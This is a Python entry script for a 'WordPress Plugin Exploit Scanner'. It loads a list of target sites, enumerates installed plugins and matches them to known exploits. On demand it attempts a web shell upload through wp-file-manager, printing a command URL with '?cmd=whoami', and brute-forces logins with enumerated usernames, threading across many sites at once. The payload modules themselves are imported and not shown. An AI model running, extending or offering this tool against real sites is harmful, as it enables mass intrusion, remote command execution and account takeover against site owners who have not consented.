import argparse
from modules.plugin_enum import enumerate_plugins
from modules.exploit_checker import check_local_exploits
from modules.report_writer import save_report
from modules.alive_checker import is_site_alive
from modules.shell_exploit import try_shell_upload
from modules.brute_force import brute_force_login
from modules.user_enum import enumerate_usernames
from data.plugins import load_plugins
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

def load_sites_txt(filename="sites_list.txt"):
    try:
        with open(filename, "r") as f:
            return list(set([line.strip().rstrip("/") for line in f if line.strip()]))
    except:
        print(Fore.RED + "[!] Could not load site list.")
        return []

def scan_site(site, plugin_list, args):
    print(Fore.CYAN + f"\n[+] Checking if site is alive: {site}")
    if not is_site_alive(site):
        print(Fore.RED + f"[-] Site not responding, skipping: {site}")
        return

    print(Fore.GREEN + f"[✓] Site is alive. Scanning plugins...")
    found_plugins = enumerate_plugins(site, plugin_list, verbose=args.verbose)
    results = check_local_exploits(found_plugins)

    if args.exploit and "wp-file-manager" in found_plugins:
        shell_url = try_shell_upload(site)
        if shell_url:
            print(Fore.MAGENTA + f"[💀] CMD access: {shell_url}?cmd=whoami")

    if args.brute:
        usernames = enumerate_usernames(site)
        if args.verbose:
            print(Fore.YELLOW + f"[~] Usernames found: {', '.join(usernames)}")
        if usernames:
            user, pwd = brute_force_login(site, usernames, verbose=args.verbose)
            if user:
                print(Fore.GREEN + f"[🔓] Brute Login Success → {user}:{pwd}")
            else:
                print(Fore.LIGHTBLACK_EX + "[x] Brute-force failed.")
        else:
            print(Fore.YELLOW + "[!] No usernames found for brute-force.")

    save_report(site, results)

def main():
    parser = argparse.ArgumentParser(
        description="🛠️ WordPress Plugin Exploit Scanner",
        epilog="Examples:\n"
               "  python main.py --target https://example.com --exploit\n"
               "  python main.py --all --threads 10 --verbose",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("--exploit", action="store_true", help="💀 Try known shell exploits (e.g. wp-file-manager)")
    parser.add_argument("--brute", action="store_true", help="🔓 Try brute-force login using found usernames")
    parser.add_argument("--all", action="store_true", help="🔥 Enable both exploit and brute-force")
    parser.add_argument("--target", type=str, help="🎯 Scan a single target site (e.g., https://example.com)")
    parser.add_argument("--threads", type=int, default=5, help="⚙️ Number of threads for faster scanning (default: 5)")
    parser.add_argument("--verbose", action="store_true", help="🗣️ Enable verbose debug output during scanning")

    args = parser.parse_args()

    if args.all:
        args.exploit = True
        args.brute = True

    print(Fore.MAGENTA + "★ WP Plugin Exploit Scanner ★\n")

    if args.target:
        sites = [args.target.strip().rstrip("/")]
        print(f"[+] Single target mode: {sites[0]}")
    else:
        sites = load_sites_txt()
        if not sites:
            print(Fore.RED + "[!] No sites to scan.")
            return

    print(Fore.CYAN + "\nSelect Scan Mode:")
    print("1. Fast Scan (top plugins only)")
    print("2. Deep Scan (all known plugins)")
    print("3. Custom Plugin List")
    mode = input("Your choice [1/2/3]: ").strip()
    plugin_list = load_plugins(mode)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for site in sites:
            executor.submit(scan_site, site, plugin_list, args)

if __name__ == "__main__":
    main()
